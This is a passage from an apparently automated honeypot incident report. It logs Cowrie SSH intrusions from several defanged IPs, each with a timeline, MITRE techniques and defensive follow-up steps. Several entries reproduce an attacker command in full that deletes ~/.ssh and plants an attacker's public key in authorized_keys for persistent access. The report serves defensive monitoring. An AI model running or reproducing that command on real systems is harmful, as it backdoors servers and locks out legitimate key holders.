| `2026-06-09 13:08:30` | `cowrie.command.input` |
| `2026-06-09 13:08:31` | `cowrie.session.file_download` |
| `2026-06-09 13:08:31` | `cowrie.log.closed` |
| `2026-06-09 13:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5cddff513ad

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 13:08 |
| **Last Seen** | 2026-06-09 13:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:08:39` | `cowrie.session.connect` |
| `2026-06-09 13:08:39` | `cowrie.client.version` |
| `2026-06-09 13:08:39` | `cowrie.client.kex` |
| `2026-06-09 13:08:42` | `cowrie.login.success` |
| `2026-06-09 13:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0624336b3fbf

| Field | Detail |
|---|---|
| **Source IP** | `45.114.63[.]76` |
| **First Seen** | 2026-06-09 13:15 |
| **Last Seen** | 2026-06-09 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:15:21` | `cowrie.session.connect` |
| `2026-06-09 13:15:21` | `cowrie.client.version` |
| `2026-06-09 13:15:21` | `cowrie.client.kex` |
| `2026-06-09 13:15:21` | `cowrie.login.success` |
| `2026-06-09 13:15:22` | `cowrie.session.params` |
| `2026-06-09 13:15:22` | `cowrie.command.input` |
| `2026-06-09 13:15:22` | `cowrie.log.closed` |
| `2026-06-09 13:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.114.63[.]76` to AbuseIPDB if not already reported
- [ ] Block `45.114.63[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a8dc2ea57c6

| Field | Detail |
|---|---|
| **Source IP** | `45.114.63[.]76` |
| **First Seen** | 2026-06-09 13:16 |
| **Last Seen** | 2026-06-09 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:16:02` | `cowrie.session.connect` |
| `2026-06-09 13:16:02` | `cowrie.client.version` |
| `2026-06-09 13:16:02` | `cowrie.client.kex` |
| `2026-06-09 13:16:03` | `cowrie.login.success` |
| `2026-06-09 13:16:03` | `cowrie.session.params` |
| `2026-06-09 13:16:03` | `cowrie.command.input` |
| `2026-06-09 13:16:03` | `cowrie.log.closed` |
| `2026-06-09 13:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.114.63[.]76` to AbuseIPDB if not already reported
- [ ] Block `45.114.63[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7acaf9de5e98

| Field | Detail |
|---|---|
| **Source IP** | `45.114.63[.]76` |
| **First Seen** | 2026-06-09 13:16 |
| **Last Seen** | 2026-06-09 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:16:07` | `cowrie.session.connect` |
| `2026-06-09 13:16:07` | `cowrie.client.version` |
| `2026-06-09 13:16:07` | `cowrie.client.kex` |
| `2026-06-09 13:16:07` | `cowrie.login.success` |
| `2026-06-09 13:16:08` | `cowrie.session.params` |
| `2026-06-09 13:16:08` | `cowrie.command.input` |
| `2026-06-09 13:16:08` | `cowrie.log.closed` |
| `2026-06-09 13:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.114.63[.]76` to AbuseIPDB if not already reported
- [ ] Block `45.114.63[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a975c817d54

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 13:22 |
| **Last Seen** | 2026-06-09 13:22 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:22:07` | `cowrie.session.connect` |
| `2026-06-09 13:22:07` | `cowrie.client.version` |
| `2026-06-09 13:22:09` | `cowrie.client.kex` |
| `2026-06-09 13:22:13` | `cowrie.login.success` |
| `2026-06-09 13:22:16` | `cowrie.session.params` |
| `2026-06-09 13:22:16` | `cowrie.command.input` |
| `2026-06-09 13:22:16` | `cowrie.command.failed` |
| `2026-06-09 13:22:22` | `cowrie.log.closed` |
| `2026-06-09 13:22:25` | `cowrie.session.params` |
| `2026-06-09 13:22:25` | `cowrie.command.input` |
| `2026-06-09 13:22:26` | `cowrie.session.file_download` |
| `2026-06-09 13:22:26` | `cowrie.log.closed` |
| `2026-06-09 13:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b966875ec6

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 13:22 |
| **Last Seen** | 2026-06-09 13:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:22:38` | `cowrie.session.connect` |
| `2026-06-09 13:22:39` | `cowrie.client.version` |
| `2026-06-09 13:22:42` | `cowrie.client.kex` |
| `2026-06-09 13:22:46` | `cowrie.login.success` |
| `2026-06-09 13:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7cb8df06a25

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 13:28 |
| **Last Seen** | 2026-06-09 13:29 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:28:42` | `cowrie.session.connect` |
| `2026-06-09 13:28:42` | `cowrie.client.version` |
| `2026-06-09 13:28:43` | `cowrie.client.kex` |
| `2026-06-09 13:28:49` | `cowrie.login.success` |
| `2026-06-09 13:28:55` | `cowrie.session.params` |
| `2026-06-09 13:28:55` | `cowrie.command.input` |
| `2026-06-09 13:28:55` | `cowrie.command.failed` |
| `2026-06-09 13:28:55` | `cowrie.log.closed` |
| `2026-06-09 13:28:56` | `cowrie.session.params` |
| `2026-06-09 13:28:56` | `cowrie.command.input` |
| `2026-06-09 13:28:57` | `cowrie.session.file_download` |
| `2026-06-09 13:28:57` | `cowrie.log.closed` |
| `2026-06-09 13:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6760457cb413

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 13:29 |
| **Last Seen** | 2026-06-09 13:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:29:14` | `cowrie.session.connect` |
| `2026-06-09 13:29:15` | `cowrie.client.version` |
| `2026-06-09 13:29:15` | `cowrie.client.kex` |
| `2026-06-09 13:29:19` | `cowrie.login.success` |
| `2026-06-09 13:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c368afc4105c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]155` |
| **First Seen** | 2026-06-09 13:32 |
| **Last Seen** | 2026-06-09 13:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:32:33` | `cowrie.session.connect` |
| `2026-06-09 13:32:33` | `cowrie.client.version` |
| `2026-06-09 13:32:33` | `cowrie.client.kex` |
| `2026-06-09 13:32:34` | `cowrie.login.success` |
| `2026-06-09 13:32:34` | `cowrie.session.params` |
| `2026-06-09 13:32:34` | `cowrie.command.input` |
| `2026-06-09 13:32:34` | `cowrie.command.failed` |
| `2026-06-09 13:32:34` | `cowrie.log.closed` |
| `2026-06-09 13:32:34` | `cowrie.session.params` |
| `2026-06-09 13:32:34` | `cowrie.command.input` |
| `2026-06-09 13:32:35` | `cowrie.session.file_download` |
| `2026-06-09 13:32:35` | `cowrie.log.closed` |
| `2026-06-09 13:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21f3279c150

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]155` |
| **First Seen** | 2026-06-09 13:32 |
| **Last Seen** | 2026-06-09 13:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:32:43` | `cowrie.session.connect` |
| `2026-06-09 13:32:43` | `cowrie.client.version` |
| `2026-06-09 13:32:43` | `cowrie.client.kex` |
| `2026-06-09 13:32:43` | `cowrie.login.success` |
| `2026-06-09 13:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e09a68ee103e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]155` |
| **First Seen** | 2026-06-09 13:36 |
| **Last Seen** | 2026-06-09 13:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:36:04` | `cowrie.session.connect` |
| `2026-06-09 13:36:04` | `cowrie.client.version` |
| `2026-06-09 13:36:04` | `cowrie.client.kex` |
| `2026-06-09 13:36:05` | `cowrie.login.success` |
| `2026-06-09 13:36:05` | `cowrie.session.params` |
| `2026-06-09 13:36:05` | `cowrie.command.input` |
| `2026-06-09 13:36:05` | `cowrie.command.failed` |
| `2026-06-09 13:36:05` | `cowrie.log.closed` |
| `2026-06-09 13:36:05` | `cowrie.session.params` |
| `2026-06-09 13:36:05` | `cowrie.command.input` |
| `2026-06-09 13:36:06` | `cowrie.session.file_download` |
| `2026-06-09 13:36:06` | `cowrie.log.closed` |
| `2026-06-09 13:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aefed7657357

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]155` |
| **First Seen** | 2026-06-09 13:36 |
| **Last Seen** | 2026-06-09 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:36:13` | `cowrie.session.connect` |
| `2026-06-09 13:36:13` | `cowrie.client.version` |
| `2026-06-09 13:36:13` | `cowrie.client.kex` |
| `2026-06-09 13:36:13` | `cowrie.login.success` |
| `2026-06-09 13:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-591832694933

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 13:58 |
| **Last Seen** | 2026-06-09 13:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:58:15` | `cowrie.session.connect` |
| `2026-06-09 13:58:15` | `cowrie.client.version` |
| `2026-06-09 13:58:15` | `cowrie.client.kex` |
| `2026-06-09 13:58:16` | `cowrie.login.success` |
| `2026-06-09 13:58:16` | `cowrie.session.params` |
| `2026-06-09 13:58:16` | `cowrie.command.input` |
| `2026-06-09 13:58:16` | `cowrie.command.failed` |
| `2026-06-09 13:58:17` | `cowrie.log.closed` |
| `2026-06-09 13:58:17` | `cowrie.session.params` |
| `2026-06-09 13:58:17` | `cowrie.command.input` |
| `2026-06-09 13:58:17` | `cowrie.session.file_download` |
| `2026-06-09 13:58:17` | `cowrie.log.closed` |
| `2026-06-09 13:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc0552a7ebfd

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 13:58 |
| **Last Seen** | 2026-06-09 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:58:19` | `cowrie.session.connect` |
| `2026-06-09 13:58:19` | `cowrie.client.version` |
| `2026-06-09 13:58:19` | `cowrie.client.kex` |
| `2026-06-09 13:58:20` | `cowrie.login.success` |
| `2026-06-09 13:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249d6f913e12

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 14:03 |
| **Last Seen** | 2026-06-09 14:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:03:54` | `cowrie.session.connect` |
| `2026-06-09 14:03:54` | `cowrie.client.version` |
| `2026-06-09 14:03:54` | `cowrie.client.kex` |
| `2026-06-09 14:03:55` | `cowrie.login.success` |
| `2026-06-09 14:03:55` | `cowrie.session.params` |
| `2026-06-09 14:03:55` | `cowrie.command.input` |
| `2026-06-09 14:03:55` | `cowrie.command.failed` |
| `2026-06-09 14:03:55` | `cowrie.log.closed` |
| `2026-06-09 14:03:56` | `cowrie.session.params` |
| `2026-06-09 14:03:56` | `cowrie.command.input` |
| `2026-06-09 14:03:56` | `cowrie.session.file_download` |
| `2026-06-09 14:03:56` | `cowrie.log.closed` |
| `2026-06-09 14:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14dbed8d73c4

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 14:03 |
| **Last Seen** | 2026-06-09 14:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:03:58` | `cowrie.session.connect` |
| `2026-06-09 14:03:58` | `cowrie.client.version` |
| `2026-06-09 14:03:58` | `cowrie.client.kex` |
| `2026-06-09 14:03:59` | `cowrie.login.success` |
| `2026-06-09 14:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f20dff9a545

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 14:12 |
| **Last Seen** | 2026-06-09 14:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:12:49` | `cowrie.session.connect` |
| `2026-06-09 14:12:49` | `cowrie.client.version` |
| `2026-06-09 14:12:50` | `cowrie.client.kex` |
| `2026-06-09 14:12:50` | `cowrie.login.success` |
| `2026-06-09 14:12:50` | `cowrie.session.params` |
| `2026-06-09 14:12:50` | `cowrie.command.input` |
| `2026-06-09 14:12:50` | `cowrie.command.failed` |
| `2026-06-09 14:12:51` | `cowrie.log.closed` |
| `2026-06-09 14:12:51` | `cowrie.session.params` |
| `2026-06-09 14:12:51` | `cowrie.command.input` |
| `2026-06-09 14:12:51` | `cowrie.session.file_download` |
| `2026-06-09 14:12:51` | `cowrie.log.closed` |
| `2026-06-09 14:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cd562bd3336

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 14:12 |
| **Last Seen** | 2026-06-09 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:12:53` | `cowrie.session.connect` |
| `2026-06-09 14:12:53` | `cowrie.client.version` |
| `2026-06-09 14:12:53` | `cowrie.client.kex` |
| `2026-06-09 14:12:54` | `cowrie.login.success` |
| `2026-06-09 14:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ab81f8d59d

| Field | Detail |
|---|---|
| **Source IP** | `119.96.157[.]188` |
| **First Seen** | 2026-06-09 14:13 |
| **Last Seen** | 2026-06-09 14:14 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
